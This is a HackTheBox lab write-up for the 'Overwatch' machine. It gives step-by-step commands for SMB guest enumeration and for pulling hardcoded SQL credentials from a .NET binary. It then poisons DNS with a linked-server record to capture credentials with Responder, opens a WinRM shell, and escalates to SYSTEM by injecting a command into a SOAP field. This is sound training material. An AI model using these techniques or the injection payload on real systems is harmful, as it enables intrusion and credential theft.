---
title: "Overwatch"
date: 2026-02-10T17:00:01Z
categories: [HackTheBox, Writeup]
tags: [htb, hackthebox, writeup, pentest, overwatch]
description: "HackTheBox Overwatch machine writeup — reconnaissance and enumeration walkthrough."
toc: true
comments: true
---


**Domain:** overwatch.htb\
**Target IP:** 10.129.13.226\
**Attacker IP:** 10.10.14.159

------------------------

## Initial Situation

The target exposes a full Active Directory footprint alongside MSSQL and
WinRM.\
This immediately frames the machine as an enterprise host, not a
standalone server.\
In such environments, exploitation rarely comes from a single
vulnerability - instead, it emerges from trust relationships between
services.

The objective is to locate those trust boundaries and force them to work
against the system.

------------------------

## Phase 1 - Mapping the Attack Surface

A full TCP scan is performed to understand how the host is positioned
within the domain.

``` bash
nmap -sC -sV -p- 10.129.13.226
```

### What the scan reveals

-   The host is a domain-joined Windows server\
-   Active Directory services (DNS, LDAP, Kerberos) are exposed\
-   SMB (445) is reachable\
-   WinRM (5985) is enabled\
-   MSSQL is listening on a non-default port (6520)

This combination strongly suggests:

-   Domain authentication is in use\
-   Service accounts likely exist\
-   Internal tooling may be deployed

SMB is chosen as the first entry point.

------------------------

## Phase 2 - SMB Enumeration and File Exposure

Anonymous enumeration is attempted using guest credentials.

``` bash
smbclient -L //10.129.13.226 -U guest%
```

Among default administrative shares, one non-standard share stands out:

``` text
software$
```

Despite being hidden, it allows unauthenticated access.

``` bash
smbclient //10.129.13.226/software$ -U guest%
```

Inside the share, a directory named **Monitoring** is found.\
The contents suggest a compiled internal application rather than user
data.

``` bash
cd Monitoring
ls
```

### Files of interest

-   overwatch.exe\
-   overwatch.exe.config\
-   overwatch.pdb

These are pulled locally for inspection.

``` bash
get overwatch.exe
get overwatch.exe.config
get overwatch.pdb
```

At this point, the machine has already leaked internal operational
tooling.

------------------------

## Phase 3 - Understanding the Application Architecture

The configuration file is inspected first.

``` bash
cat overwatch.exe.config
```

### Observations

-   The application exposes a WCF SOAP service\
-   The service endpoint is:

``` text
http://overwatch.htb:8000/MonitorService
```

-   `basicHttpBinding` is used\
-   No authentication mechanisms are defined

This confirms the service was intended for internal use only, relying on
network isolation rather than access control.

------------------------

## Phase 4 - Extracting Secrets from the Binary

Because the application is written in .NET, it can be disassembled
without reverse engineering native code.

``` bash
monodis overwatch.exe > overwatch_il.txt
```

Searching for embedded strings:

``` bash
grep -i "ldstr" overwatch_il.txt | grep -i "server\|user\|password"
```

### Result

``` text
Server=localhost;
Database=SecurityLogs;
User Id=sqlsvc;
Password=TI0LKcfHzZw1Vv;
```

The binary contains hardcoded database credentials, embedded directly in
the executable.\
This immediately expands the attack surface from SMB into the database
layer.

------------------------

## Phase 5 - MSSQL Access Using Embedded Credentials

Using the recovered credentials, a connection to SQL Server is
established.

``` bash
impacket-mssqlclient 'overwatch/sqlsvc:TI0LKcfHzZw1Vv@10.129.13.226' -port 6520 -windows-auth
```

The connection succeeds, confirming:

-   Credentials are valid\
-   SQL authentication is using Windows domain context

Privilege verification follows.

``` sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### Output

``` text
0
```

This rules out direct OS command execution via SQL, but access is still
sufficient for lateral discovery.

------------------------

## Phase 6 - Discovering a Broken Trust (Linked Servers)

Linked servers are enumerated next.

``` sql
EXEC sp_linkedservers;
```

### Output

``` text
SQL07
```

Attempts to query it fail, indicating the host does not exist or is
unreachable.\
This is not a dead end - it is an opportunity.

In Windows environments, name resolution failures trigger authentication
attempts.\
If the name can be controlled, credentials can be captured.

------------------------

## Phase 7 - Turning Name Resolution into an Attack

Before attempting DNS manipulation, directory permissions are checked.

``` bash
bloodyAD -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --host 10.129.13.226 get writable
```

The output confirms that the account has sufficient permissions to
modify directory objects.

A DNS record for the non-existent linked server is added, pointing it to
the attacker.

``` bash
bloodyAD -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --host 10.129.13.226 add dnsRecord SQL07 10.10.14.159
```

This causes:

``` text
SQL07.overwatch.htb → attacker machine
```

------------------------

## Phase 8 - Capturing Stored Credentials

Responder is started to listen for inbound authentication.

``` bash
sudo responder -I tun0 -v
```

Back in MSSQL, the linked server is triggered.

``` sql
EXEC ('SELECT 1') AT SQL07;
```

### What happens internally

-   SQL Server attempts to authenticate to SQL07\
-   DNS now resolves to the attacker\
-   Stored credentials are transmitted\
-   Responder captures them in cleartext

### Captured credentials

``` text
Username: sqlmgmt
Password: bIhBbzMM<REDACTED>
```

This confirms that the linked server was configured using hardcoded
credentials, not delegation.

------------------------

## Phase 9 - User Access via WinRM

With valid domain credentials, WinRM access is attempted.

``` bash
evil-winrm -i 10.129.13.226 -u sqlmgmt -p 'bIhBbzMM<REDACTED>'
```

The session opens successfully under the `sqlmgmt` account.

The user flag is retrieved:

``` powershell
cd C:\Users\sqlmgmt\Desktop
type user.txt
a5f37370e113eab2051<REDACTED>
```

------------------------

## Phase 10 - Revisiting the Internal WCF Service

Now operating from inside the host, the previously discovered WCF
service is checked.

``` powershell
netstat -ano | findstr 8000
```

The service is bound to all interfaces but is only reachable locally.

The WSDL is queried to confirm method names.

``` powershell
Invoke-WebRequest -UseBasicParsing -Uri "http://localhost:8000/MonitorService?wsdl"
```

The interface is identified as:

``` text
IMonitoringService
```

------------------------

## Phase 11 - Exploiting Command Injection (SYSTEM Context)

Binary analysis earlier revealed that the KillProcess method builds a
PowerShell command by concatenating user input:

``` powershell
Stop-Process -Name <input> -Force
```

This allows command injection using a semicolon.

SOAP headers are prepared:

``` powershell
$headers = @{
  "SOAPAction" = "http://tempuri.org/IMonitoringService/KillProcess"
}
```

A malicious SOAP body is crafted:

``` powershell
$body = @'
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>test; net localgroup Administrators sqlmgmt /add #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
'@
```

The request is sent locally:

``` powershell
Invoke-WebRequest -UseBasicParsing `
-Uri "http://localhost:8000/MonitorService" `
-Method POST `
-Headers $headers `
-ContentType "text/xml; charset=utf-8" `
-Body $body
```

The response confirms successful execution.\
The command runs as \*\*NT AUTHORITY`\SYSTEM*`{=tex}\*.

------------------------

---

<div class="paywall-section">
  <div class="paywall-fade"></div>
  <div class="paywall-cta">
    <div class="paywall-icon">🔒</div>
    <h3>Premium Content</h3>
    <p>The full exploitation walkthrough, privilege escalation, and flags are available exclusively for members.</p>
    <a href="https://whop.com/andres-411f/" target="_blank" rel="noopener" class="paywall-btn">
      Unlock Full Writeup →
    </a>
  </div>
</div>
